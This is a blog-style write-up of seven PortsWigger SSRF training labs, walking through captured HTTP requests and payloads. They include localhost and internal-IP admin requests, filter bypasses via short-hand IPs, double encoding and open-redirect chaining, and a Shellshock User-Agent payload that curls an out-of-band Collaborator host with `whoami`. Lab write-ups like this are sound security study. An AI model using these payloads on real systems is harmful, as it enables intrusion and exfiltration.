---
title: PortsWigger Server Side Request Foregery (SSRF) Labs - November 2025
published: 2025-11-16
description: Writeup of SSRF.
tags:
  - SSRF
  - Burpsuite
  - Caido
image: images/cover.png
category: PortsWigger Labs Writeups
draft: false
---
# Server Side Request Forgery 

![Pasted image 20251112022752.png](images/Pasted_image_20251112022752.png)

- Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.
- In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.

## Lab 1: Basic SSRF against the local server

![Pasted image 20251110091329.png](images/Pasted_image_20251110091329.png)

- After Accessing the labs we just have to view details page and check the stocks and capture that req,

![Pasted image 20251110091544.png](images/Pasted_image_20251110091544.png)

![Pasted image 20251110091633.png](images/Pasted_image_20251110091633.png)

- We can see that it is `/product/stock` API with some parameters, 

```http
POST /product/stock HTTP/1.1
Host: 0aec00920488b14a831574bd00f400be.web-security-academy.net
Connection: keep-alive
Content-Length: 107
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Origin: https://0aec00920488b14a831574bd00f400be.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aec00920488b14a831574bd00f400be.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=prucCPckJHbFkihl7fKpuxwB6UD5jFJB

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Now after URL Decoding the body parameters we can see that there is URL which is requesting some site so we can try localhost URL, 

```http
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

- By Replacing with this, and url encode it (optional)

```http
stockApi=http://localhost/admin/delete?username=carlos
```

![Pasted image 20251110092016.png](images/Pasted_image_20251110092016.png)

- It gives `302 found` which means that it is successful and user `carlos` is deleted.

![Pasted image 20251110092128.png](images/Pasted_image_20251110092128.png)


## Lab 2: Basic SSRF against another back-end system

![Pasted image 20251110092828.png](images/Pasted_image_20251110092828.png)

- After Accessing the labs we just have to view details page and check the stocks and capture that req,

![Pasted image 20251110091544.png](images/Pasted_image_20251110091544.png)

![Pasted image 20251110091633.png](images/Pasted_image_20251110091633.png)

```http
POST /product/stock HTTP/1.1
Host: 0a64008904342da18004175b007f00ec.web-security-academy.net
Connection: keep-alive
Content-Length: 96
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a64008904342da18004175b007f00ec.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a64008904342da18004175b007f00ec.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=KPWArg1rlSYSP2gZWhS3QGG4w684zBT3

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Now in this lab we have to brute force thought IP range `192.168.0.X`,

```http
POST /product/stock HTTP/1.1
Host: 0a64008904342da18004175b007f00ec.web-security-academy.net
Connection: close
Content-Length: 40
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a64008904342da18004175b007f00ec.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a64008904342da18004175b007f00ec.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=KPWArg1rlSYSP2gZWhS3QGG4w684zBT3

stockApi=http://192.168.0.$X$:8080/admin/
```

- So we will add this to automate and start attack and we will filter by status code `200`,

![Pasted image 20251110094305.png](images/Pasted_image_20251110094305.png)

![Pasted image 20251110094343.png](images/Pasted_image_20251110094343.png)

- We get `200` on this IP range, `192.168.0.150` so now again we include delete API and send it and we solve the lab,

```http
POST /product/stock HTTP/1.1
Host: 0a64008904342da18004175b007f00ec.web-security-academy.net
Connection: close
Content-Length: 40
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a64008904342da18004175b007f00ec.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a64008904342da18004175b007f00ec.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=KPWArg1rlSYSP2gZWhS3QGG4w684zBT3

stockApi=http://192.168.0.150:8080/admin/delete?username=carlos
```

![Pasted image 20251110094506.png](images/Pasted_image_20251110094506.png)

![Pasted image 20251110094021.png](images/Pasted_image_20251110094021.png)

## Lab 3: Blind SSRF with out-of-band detection

![Pasted image 20251111234021.png](images/Pasted_image_20251111234021.png)

- We will intercept the `view product` request,

![Pasted image 20251111234313.png](images/Pasted_image_20251111234313.png)

```http
GET /product?productId=1 HTTP/2
Host: 0a2a00a50460650d80759acc00cd001c.web-security-academy.net
Cookie: session=7dFYQWS30mNOvYptqZVWYYr1kiQCl65N
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2a00a50460650d80759acc00cd001c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- Now we have to replace `refere header` with our own http/dns server for call back and in this case we will use `burp collaborator`,
- We will replace it with this,

```http
https://fxg6y0ele5p7b5l70q06r7iu6lcc06ov.oastify.com
```

![Pasted image 20251111235616.png](images/Pasted_image_20251111235616.png)

- And after some min we got callback in out collaborator tab, and solved the lab

![Pasted image 20251111235645.png](images/Pasted_image_20251111235645.png)

![Pasted image 20251111235713.png](images/Pasted_image_20251111235713.png)

## Lab 4: SSRF with blacklist-based input filter

![Pasted image 20251112000915.png](images/Pasted_image_20251112000915.png)

- This lab has a stock check feature which fetches data from an internal system so we fetch request of it and try something on it.

```http
POST /product/stock HTTP/2
Host: 0aa9008404dfa5fa811ab1e600af0083.web-security-academy.net
Cookie: session=FroC7jn7kXGrwyTqqPosH42HNkuxDryA
Content-Length: 107
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Origin: https://0aa9008404dfa5fa811ab1e600af0083.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa9008404dfa5fa811ab1e600af0083.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- I replace `stockApi` with some typical payloads of SSRF which is,
	- http://127.0.0.1/admin
	- http://localhost/admin
	- but failed and shows this msg `"External stock check blocked for security reasons"` with `400 bad request`.

- So i decided to do brute force with all SSRF variations payloads and I used this [payload list](https://gist.githubusercontent.com/rootsploit/66c9ae8fc3ef387fa5ffbb67fcef0766/raw/d5a4088d628ed05f161b9dd9bf3c6755910a164f/SSRF-Payloads.txt) in intruder. 

![Pasted image 20251112002028.png](images/Pasted_image_20251112002028.png)

- And it works perfectly and got 2 payload which works,
	- `http://127.1`
	- `http://127.0.1`
- This can be consider as short-hand IP addresses by dropping the zeros

![Pasted image 20251112001716.png](images/Pasted_image_20251112001716.png)

- Now simple add `/admin/delete?username=carlos` and we can to able solve but no there one trick which is that we can't able to access `/admin` so it blocks the request,

![Pasted image 20251112002629.png](images/Pasted_image_20251112002629.png)

- So i tried multiple and this is what works,
- I double encode the `a` character and place it,

```
a -> %61 -> %25%36%31
```

![Pasted image 20251112002900.png](images/Pasted_image_20251112002900.png)

- Now we can do this `/admin/delete?username=carlos` and it worked,

![Pasted image 20251112003041.png](images/Pasted_image_20251112003041.png)

![Pasted image 20251112003055.png](images/Pasted_image_20251112003055.png)
## Lab 5: SSRF with filter bypass via open redirection vulnerability

![Pasted image 20251112003212.png](images/Pasted_image_20251112003212.png)

- We have to again check stocks feature and capture the req,

![Pasted image 20251112003329.png](images/Pasted_image_20251112003329.png)

```http
POST /product/stock HTTP/2
Host: 0a81004704f58371828d3aca003900ba.web-security-academy.net
Cookie: session=ygzRzmhRAOCMgtWwlxpb6NN6oEpW7XwJ
Content-Length: 65
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a81004704f58371828d3aca003900ba.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a81004704f58371828d3aca003900ba.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- URL decoded `stockAPI`, and this time this is only path and parameters,

```
/product/stock/check?productId=1&storeId=1
```

- As description says, =="The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first."==
- So i tried to find some request like that and i found one when we do `Next product` and capture that request,

```http
GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
Host: 0a81004704f58371828d3aca003900ba.web-security-academy.net
Cookie: session=zZHgN95G7oq4VGrrY1NZK3HcXccfbGBs; session=ygzRzmhRAOCMgtWwlxpb6NN6oEpW7XwJ
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a81004704f58371828d3aca003900ba.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- This GET parameters can be pass directly to that post request because it is using this same endpoint and querying and in this endpoint there is one parameter named `path` where we can inject out URL, 

```bash
/product/nextProduct?currentProductId=2&path=/product?productId=3
```

```bash
/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin?productId=3?
```

- if we send req with with this upper parameters then it will redirect us to that page which is `open redirect` vulnerability and we have to chain this with SSRF, 
- so we have to take this and put that into previous `stockAPI` parameter and it works and we got `200 OK` so it means we inject our URL indirectly in another parameters, 
- ==so we bypass the relative path check and also add url==

![Pasted image 20251112004450.png](images/Pasted_image_20251112004450.png)

- Now we can add delete user parameters and we will solve the lab, `/admin/delete?username=carlos`

![Pasted image 20251112005333.png](images/Pasted_image_20251112005333.png)

```bash
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![Pasted image 20251112005343.png](images/Pasted_image_20251112005343.png)

## Lab 6: Blind SSRF with Shellshock exploitation

![Pasted image 20251112010544.png](images/Pasted_image_20251112010544.png)

- As per description, we have to grep `productID` req and change its `referer` with out collab domain which is `1jlskm070rbtxr7tmcmsdt4gs7yymtai.oastify.com`

```http
GET /product?productId=1 HTTP/2
Host: 0ae40005040d22ca8156c5b4006c00c5.web-security-academy.net
Cookie: session=GfmFWgnW9V0VoouvfAGFoQnwcRKqrfRI
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae40005040d22ca8156c5b4006c00c5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

```http
Referer: https://1jlskm070rbtxr7tmcmsdt4gs7yymtai.oastify.com
```

![Pasted image 20251112010916.png](images/Pasted_image_20251112010916.png)

- And we got response in out collab,

![Pasted image 20251112011030.png](images/Pasted_image_20251112011030.png)

- Now we have to exploit shellshock vulnerability, 
- This is the classic Shellshock payload, where we can inject any command in `ANY_COMMAND`

```bash
() { :;}; ANY_COMMAND
```

- In our case we have blind SSRF so we have to get callback of DNS/HTTP into collaborators along with `name of OS user` so here is the whole payload,

```bash
() { :;}; curl http://g3k741kmk6v8h6r86r67x8ovcmid6auz.oastify.com/`whoami`
```

- Now we will add this into `User-Agent` header from which it execute this,
- ([Reference Related to ShellShock.....](https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html))
- And it is on internal server with some ip with this range, `192.168.0.X:8080` so we have to brute force that,
- Here is the full request and we will start brute force in intruder.  

```http
GET /product?productId=1 HTTP/2
Host: 0ae40005040d22ca8156c5b4006c00c5.web-security-academy.net
Cookie: session=GfmFWgnW9V0VoouvfAGFoQnwcRKqrfRI
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; curl http://2gjthnx8xs8uus4ujdjtau1hp8vzjqaez.oastify.com/`whoami`
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://192.168.0.X:8080/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- Starting the attack

![Pasted image 20251112015556.png](images/Pasted_image_20251112015556.png)

- We got response in collaborator and got the OS user name, and by submitting this we solve the lab

```bash
peter-3kO3iK.nvmew8ctcdnf9djfyyyepfg24takybvzk.oastify.com.
```

```bash
peter-3kO3iK
```

![Pasted image 20251112015531.png](images/Pasted_image_20251112015531.png)

![Pasted image 20251112015736.png](images/Pasted_image_20251112015736.png)

>[!summary]
>trigger a blind SSRF from the app (which fetches the `Referer` URL) to an internal `192.168.0.X:8080` host and use a Shellshock payload (in a header) to make that internal server perform a DNS lookup to my Burp Collaborator domain, the DNS request will contain the OS username, which you then submit to finish the lab

## Lab 7: SSRF with whitelist-based input filter

![Pasted image 20251112020255.png](images/Pasted_image_20251112020255.png)

- We have to do SSRF on same parameter as previous which is `/product/stock` and here is the captured request of it,

```http
POST /product/stock HTTP/1.1
Host: 0af50028036541f181472afa005c0005.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0af50028036541f181472afa005c0005.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af50028036541f181472afa005c0005.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=AWpvTcTmRbPBK0aq7Tr7qEvnKpkL0LmS

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

- We will try to inject URL in `stockAPI`,

```http
POST /product/stock HTTP/1.1
Host: 0af50028036541f181472afa005c0005.web-security-academy.net
Connection: keep-alive
Content-Length: 107
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/x-www-form-urlencoded
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0af50028036541f181472afa005c0005.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af50028036541f181472afa005c0005.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=AWpvTcTmRbPBK0aq7Tr7qEvnKpkL0LmS

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

- %2523 ==> Double Encoded # and it help to identify the fragment,

```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

- This is just backend functionality which might looks like this,

```c
parsed = urlparse(stockApi)
if parsed.hostname != "stock.weliketoshop.net":
    return error("External stock check host must be stock.weliketoshop.net")

```

>[!summary]
>In short, serve is checking `stock.weliketoshop.net` string before validating `%2523`  and hostname must not be `localhost` so we bypass it using `#` symbol.
>When this double-decoding happens, the URL parser now treats everything `after @ (userinfo separator) as path, not fragment`.

- So now we have to delete the user and it will solve the lab,

```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

![Pasted image 20251112154957.png](images/Pasted_image_20251112154957.png)

![Pasted image 20251112155038.png](images/Pasted_image_20251112155038.png)
